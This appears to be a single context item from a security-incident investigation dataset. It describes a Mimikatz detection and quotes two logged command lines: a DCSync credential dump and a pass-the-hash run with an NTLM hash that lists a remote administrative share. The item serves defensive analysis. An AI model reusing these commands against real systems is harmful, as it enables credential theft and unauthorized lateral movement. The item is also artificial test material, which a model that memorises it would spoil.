  "context": "In a recent security incident, the Mimikatz credential theft tool was detected on a device. Mimikatz is known for its ability to harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. This indicates that an attacker might be trying to steal credentials to impersonate a valid user and gain unauthorized access. The Process ID and command lines associated with Mimikatz include multiple uses, such as: `4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit` and `4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit`.
